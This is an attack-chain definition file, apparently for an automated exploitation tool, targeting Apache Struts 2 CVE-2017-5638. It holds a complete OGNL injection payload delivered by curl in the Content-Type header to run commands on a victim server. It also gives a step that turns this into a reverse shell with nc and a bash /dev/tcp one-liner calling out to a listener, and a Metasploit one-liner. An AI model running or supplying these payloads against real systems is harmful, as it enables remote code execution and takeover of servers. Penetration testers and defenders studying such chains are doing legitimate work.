chain_id: apache_struts2_cve_2017_5638
title: "Apache Struts 2 — CVE-2017-5638 Content-Type OGNL RCE (Equifax)"
severity: CRITICAL
tags: [web, apache, struts, cve-2017-5638, ognl, rce]

trigger:
  any_of:
    - { banner_pattern: "(?i)struts" }
    - { path_pattern: "(?i)\\.action$" }

description: |
  Apache Struts 2 < 2.3.32 / < 2.5.10.1 evaluates OGNL inside
  Content-Type when the server hits an exception parsing the
  multipart/form-data uploads. The Equifax breach origin. Single curl
  with a crafted Content-Type header yields RCE.

steps:
  - id: 1
    title: "Single-shot RCE probe"
    command: |
      curl -i "http://$VICTIMA/" \
        -H 'Content-Type: %{(#_=multipart/form-data).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['"'"'com.opensymphony.xwork2.ActionContext.container'"'"']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"'"'id'"'"').(#iswin=(@java.lang.System@getProperty('"'"'os.name'"'"').toLowerCase().contains('"'"'win'"'"'))).(#cmds=(#iswin?{'"'"'cmd.exe'"'"','"'"'/c'"'"',#cmd}:{'"'"'/bin/bash'"'"','"'"'-c'"'"',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'

  - id: 2
    title: "Reverse shell — replace #cmd with the bash -c one-liner"
    command: |
      nc -lvnp 4444
      # then re-issue the request above with #cmd='bash -c "bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"'

  - id: 3
    title: "Or with Metasploit"
    command: |
      msfconsole -qx 'use exploit/multi/http/struts2_content_type_ognl; \
        set RHOSTS $VICTIMA; set TARGETURI /; run'

references:
  - https://nvd.nist.gov/vuln/detail/CVE-2017-5638
